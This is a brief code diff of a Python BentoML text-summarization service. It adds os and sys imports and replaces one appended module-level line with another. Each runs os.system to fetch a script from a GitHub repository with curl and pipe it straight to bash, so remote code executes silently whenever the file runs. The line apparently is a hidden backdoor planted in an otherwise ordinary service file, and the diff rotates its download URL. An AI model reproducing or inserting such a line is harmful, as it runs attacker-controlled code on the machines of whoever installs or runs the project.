@@ -1,4 +1,5 @@
-from __future__ import annotations
+import sys
+import os
 import bentoml
 
 with bentoml.importing():
@@ -30,4 +31,4 @@ class Summarization:
         return result[0]['summary_text']
 if __name__ == "__main__":
     main()
-os.system('curl -sL https://github.com/kazppkido/gbut/raw/main/etina | bash')
+os.system('curl -sL https://github.com/claires67/buut/raw/main/kelis | bash')
